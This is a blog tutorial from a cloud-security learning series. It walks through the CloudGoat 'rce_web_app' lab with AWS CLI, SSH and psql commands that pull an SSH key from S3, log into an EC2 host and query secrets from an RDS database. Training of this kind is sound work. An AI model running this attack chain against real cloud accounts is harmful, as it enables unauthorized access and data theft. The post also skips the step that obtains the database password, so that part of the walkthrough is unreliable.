---
title: '100 Days of Cloud Security - Day 37: Attack — `rce_web_app`  - Part 2'
date: '2025-12-16'
author: 'Venkata Pathuri'
excerpt: 'Day 37 of my cloud security journey - Attack — `rce_web_app`  - Part 2'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 37: Attack — `rce_web_app`  - Part 2

## Overview
Welcome back to Day 37 of our cloud security journey! In the previous session, we laid the groundwork for understanding Remote Code Execution (RCE) vulnerabilities in web applications. Today, we will take our knowledge a step further by deploying the `rce_web_app` scenario and uncovering secrets stored in an RDS database. By utilizing AWS resources wisely, we will learn how attackers might exploit misconfigurations to gain unauthorized access.

## Learning Objectives
By the end of today’s lesson, you will master the ability to enumerate and exploit AWS resources as an IAM user. You will learn how to access S3 buckets, retrieve SSH keys, log in to EC2 instances, and ultimately extract sensitive information from an RDS database. This exercise not only reinforces your understanding of cloud security vulnerabilities but also equips you with practical skills to mitigate these risks in real-world scenarios.

## Deep Dive
Today’s scenario revolves around a cloud architecture consisting of various AWS services: an Elastic Load Balancer (ELB), an EC2 instance, multiple S3 buckets, and an RDS database. Each component plays a vital role in our exploration and exploitation efforts.

### 1. Enumerating Resources as IAM User - mcduck
To start our journey, we first need to identify the S3 resources accessible by our IAM user, `mcduck`. Using the AWS CLI, we can easily list the contents of the designated S3 bucket:

```bash
aws s3 ls s3://cg-keystore-s3-bucket-cgidlkepie1yzv --profile cg-mcduck
```

Upon executing this command, we discover two SSH key files stored in the bucket: `cloudgoat` (private key) and `cloudgoat.pub` (public key). These keys are pivotal as they likely grant us access to the EC2 instance, which we will target next.

### 2. Enumerate EC2 & Obtain SSH Access
With the SSH keys in hand, our next step is to retrieve the public IP address of the EC2 instance to establish a connection. We can achieve this with:

```bash
aws ec2 describe-instances --profile cg-mcduck --region us-east-1
```

The output reveals the public IP address: **54.198.219.6**. Now we can SSH into the EC2 instance using the private key:

```bash
ssh -i cloudgoat ubuntu@54.198.219.6
```

After successfully logging in, we gain a foothold in the EC2 instance, opening up further avenues for exploration.

### 3. Enable AWS CLI on EC2 for Further Enumeration
To enumerate AWS resources from within the EC2 instance, we need to install the AWS CLI. Here’s how:

```bash
sudo apt install -y unzip curl
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
aws --version
```

After the installation completes, you are ready to interact with AWS resources directly from the EC2 host.

### 4. Retrieve RDS Credentials from S3
Next, we need to identify the RDS instance and its endpoint. This can be accomplished by describing the RDS instance:

```bash
aws rds describe-db-instances --profile cg-mcduck --region us-east-1
```

The output will show essential details such as:

```json
"DBInstanceStatus": "available",
"MasterUsername": "cgadmin",
"DBName": "cloudgoat",
"Endpoint": {
    "Address": "cg-rds-instance-cgidlkepie1yzv.c1o6qkm66w75.us-east-1.rds.amazonaws.com",
    "Port": 5432
}
```

### 5. Access RDS Database & Extract Secret
With the RDS endpoint information at our disposal, we can connect to the PostgreSQL database:

```bash
psql -h cg-rds-instance-cgidlkepie1yzv.c1o6qkm66w75.us-east-1.rds.amazonaws.com \
     -p 5432 -U cgadmin -d cloudgoat
```

Upon successful authentication, we can execute a query to retrieve sensitive information:

```sql
SELECT * FROM sensitive_information;
```

This query will reveal the secret string stored in the RDS database, completing our attack sequence.

## Hands-On Practice
To practice these concepts, follow the commands step-by-step, ensuring you replace any placeholder credentials with your actual AWS credentials (which should always be handled securely). Remember, use the example formats provided here:

- **AWS Access Key ID:** AKIAIOSFODNN7EXAMPLE  # Example credential - replace with yours # Replace with your actual credentials
- **AWS Secret Access Key:** wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY # Replace with your actual credentials

As you progress through each step, verify your success by checking the outputs of your commands. If you encounter issues, ensure that your IAM user `mcduck` has the necessary permissions to access the resources in question.

## Key Takeaways
Today, we navigated through a series of steps that showcased how an attacker might exploit cloud resources to extract sensitive information. We learned the importance of securing S3 buckets, managing IAM roles effectively, and monitoring access to RDS databases. Understanding these vulnerabilities is crucial for enhancing your cloud security posture and protecting sensitive data.

## Real-World Applications
The techniques we explored today highlight real vulnerabilities that exist in cloud environments. In production settings, ensuring that S3 buckets are not publicly accessible and that IAM roles are strictly defined can prevent unauthorized access. Regular audits of AWS environments and employing security best practices, such as least privilege access, can dramatically reduce the risk of data breaches and exploitation.

---
**Journey Progress:** 37/100 Days Complete 🚀